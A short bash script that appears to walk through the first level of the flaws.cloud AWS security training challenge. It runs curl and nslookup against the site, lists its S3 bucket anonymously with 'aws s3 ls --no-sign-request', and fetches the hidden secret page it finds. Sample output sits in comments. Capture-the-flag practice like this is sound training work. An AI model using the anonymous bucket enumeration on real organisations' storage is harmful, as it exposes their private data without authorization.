#!/bin/bash
# Start at http://flaws.cloud/
curl http://flaws.cloud/

nslookup flaws.cloud 
: '
Server:         10.190.7.11
Address:        10.190.7.11#53

Non-authoritative answer:
Name:   flaws.cloud
Address: 52.218.251.74
'
nslookup 54.231.184.255
: 'Server:         10.190.7.11
Address:        10.190.7.11#53

** server cant find 255.184.231.54.in-addr.arpa: NXDOMAIN
'
aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2

:'2017-03-14 03:00:38       2575 hint1.html
2017-03-03 04:05:17       1707 hint2.html
2017-03-03 04:05:11       1101 hint3.html
2020-05-22 19:16:45       3162 index.html
2018-07-10 17:47:16      15979 logo.png
2017-02-27 01:59:28         46 robots.txt
2017-02-27 01:59:30       1051 secret-dd02c7c.html'

curl http://flaws.cloud/secret-dd02c7c.html
:'<h1>Congrats! You found the secret file!</h1>'